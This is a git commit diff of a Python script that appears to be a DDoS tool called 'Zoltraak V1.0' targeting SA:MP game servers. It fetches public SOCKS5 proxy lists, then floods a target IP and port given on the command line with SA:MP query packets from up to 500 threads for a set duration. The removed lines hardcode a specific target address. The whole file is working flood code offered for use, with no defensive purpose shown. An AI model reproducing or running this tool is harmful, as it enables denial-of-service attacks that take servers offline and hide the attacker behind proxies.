55cae13821bfbaefd00ec976f1bbe2c022246900
Waji/ <zyyduwa@gmail.com>
2024-10-05 20:18:39 +0700

    Update test.py

--- test.py
+++ test.py
@@ -1,58 +1,90 @@
+import requests
 import threading
 import socket
-import random
-import requests
 import socks
+import random
+import sys
 import struct
+import time
+import os
 
-target_ip = "204.10.192.67"
-target_port = 7777
+proxy_api_urls = [
+    #"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
+    "https://www.proxy-list.download/api/v1/get?type=socks5",
+    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
+    "https://sunny9577.github.io/proxy-scraper/generated/socks5_proxies.txt",
+    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt"                                                              ]
 
-# Ambil data proxy dari API
-url = 'https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500&page=1&sort_by=lastChecked&sort_type=desc'
-response = requests.get(url)
-data = response.json()
+proxies = set()
+for url in proxy_api_urls:
+    response = requests.get(url)
+    proxies.update(response.text.strip().replace('\r', '').split('\n'))
 
-# List untuk menyimpan proxy dalam format ip:port
-proxy_list = []
-for proxy in data['data']:
-    ip = proxy['ip']
-    port = proxy['port']
-    proxy_list.append(f"{ip}:{port}")
+print("███████████████████████████")
+print("███████▀▀▀░░░░░░░▀▀▀███████")
+print("████▀░░░░░░░░░░░░░░░░░▀████")
+print("███│░░░░░░░░░░░░░░░░░░░│███")
+print("██▌│░░░░░░░░░░░░░░░░░░░│▐██")
+print("██░└┐░░░░░░░░░░░░░░░░░┌┘░██")
+print("██░░└┐░░░░░░░░░░░░░░░┌┘░░██")
+print("██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██")
+print("██▌░│██████▌░░░▐██████│░▐██")
+print("███░│▐███▀▀░░▄░░▀▀███▌│░███")
+print("██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██")
+print("██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██")
+print("████▄─┘██▌░░░░░░░▐██└─▄████")
+print("█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████")
+print("████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████")
+print("█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████")
+print("███████▄░░░░░░░░░░░▄███████")
+print("██████████▄▄▄▄▄▄▄██████████")
+print("███████Zoltraak V1.0███████")
+print(f"█████████{len(proxies)} Proxy█████████")
+print("███████Raknet SA:MP████████")
+print("███████████████████████████")
 
-# Payload yang akan dikirim
-payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'
+target_ip = sys.argv[1]
+target_port = int(sys.argv[2])
+times = int(sys.argv[3])
+start_time = time.time()
 
-bpx = set()
+blacklisted_proxies = set()
+whitelisted_proxies = set()
 
-# Membuat socket yang menggunakan SOCKS5 proxy
 def create_proxied_socket(proxy_host, proxy_port):
-    s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP Socket
+    s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
     s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
     return s
 
-# Fungsi worker yang melakukan pengiriman payload melalui UDP
-def worker(target_ip, target_port):
-    target = (target_ip, target_port)  # IP dan port target
-    proxy = random.choice(proxy_list)  # Memilih proxy secara acak
-    if proxy not in bpx:
-        proxy_host = proxy.split(":")[0]
-        proxy_port = int(proxy.split(":")[1])
-        udp_socket = create_proxied_socket(proxy_host, proxy_port)
-        while True:
-            if udp_socket:
-                try:
-                    print(f"[{proxy}] -> Sent payload!")
-                    udp_socket.sendto(payload, target)
-                except Exception as error:
-                    print(f"[{proxy}] -> Breaking down connection. | {error}")
-                    bpx.add(proxy)
-                    udp_socket.close()
-                    break
-        return
+def tulis_proxy_ke_file():
+    with open("prox.txt", "w") as file:
+        for proxy in whitelisted_proxies:
+            file.write(proxy + "\n")
 
-# Memulai proses threading untuk mengirimkan payload melalui banyak thread
-while True:
-    while threading.active_count() >= 1000:  # Batasi jumlah thread aktif
+def worker():
+    global blacklisted_proxies
+    target = (target_ip, target_port)
+    proxy = random.choice([p for p in proxies if p not in blacklisted_proxies])
+    proxy_host = proxy.split(":")[0]
+    proxy_port = int(proxy.split(":")[1])
+    udp = create_proxied_socket(proxy_host, proxy_port)
+
+    while time.time() - start_time < times:
+        if proxy not in blacklisted_proxies:
+            try:
+                payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'
+                udp.sendto(payload, target)
+
+            except Exception as error:
+                blacklisted_proxies.add(proxy)
+                break
+    return
+
+while time.time() - start_time < times:
+    while threading.active_count() >= 500:
         pass
-    threading.Thread(target=worker, args=(target_ip, target_port)).start()
+    threading.Thread(target=worker).start()
+
+while time.time() - start_time > times:
+     os._exit(0)
